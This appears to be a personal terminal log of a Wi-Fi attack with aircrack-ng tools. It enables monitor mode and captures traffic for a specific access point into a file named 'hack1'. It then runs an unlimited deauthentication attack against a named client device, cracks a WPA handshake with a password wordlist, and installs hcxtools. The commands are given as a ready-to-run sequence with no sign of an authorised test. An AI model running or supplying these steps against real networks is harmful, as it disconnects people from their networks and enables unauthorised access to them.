devender@2612:~$ `sudo airmon-ng start wlx00c0ca59ef6f 8`

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    957 avahi-daemon
    961 NetworkManager
    982 wpa_supplicant
    983 avahi-daemon

PHY	Interface	Driver		Chipset

phy2	wlx00c0ca59ef6f	rt2800usb	Ralink Technology, Corp. RT2870/RT3070

		(mac80211 monitor mode already enabled for [phy2]wlx00c0ca59ef6f on [phy2]wlx00c0ca59ef6f)
devender@2612:~$ `sudo airmon-ng check kill`

Killing these processes:

    PID Name
    982 wpa_supplicant
 297530 avahi-daemon

devender@2612:~$ `sudo airmon-ng start wlx00c0ca59ef6f 8`


PHY	Interface	Driver		Chipset

phy2	wlx00c0ca59ef6f	rt2800usb	Ralink Technology, Corp. RT2870/RT3070
Interface wlx00c0ca59ef6fmon is too long for linux so it will be renamed to the old style (wlan#) name.

		(mac80211 monitor mode vif enabled on [phy2]wlan0mon
		(mac80211 station mode vif disabled for [phy2]wlx00c0ca59ef6f)

devender@2612:~$ `iwconfig`
lo        no wireless extensions.

eno1      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.447 GHz  Tx-Power=20 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

devender@2612:~$ `sudo airodump-ng wlan0mon`

or

devender@2612:~$ `sudo airodump-ng -w hack1 -c 8 --bssid C8:3A:35:36:A4:F8 wlan0mon`


devender@2612:~$ `sudo aireplay-ng --deauth 0 -a C8:3A:35:36:A4:F8 -c 4C:EF:C0:B4:2A:1C wlan0mon`


`sudo aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap`




`cd ~/Downloads`
`wget http://archive.ubuntu.com/ubuntu/pool/universe/h/hcxtools/hcxtools_6.0.2-1_amd64.deb`
`sudo apt-get install ./hcxtools_6.0.2-1_amd64.deb`
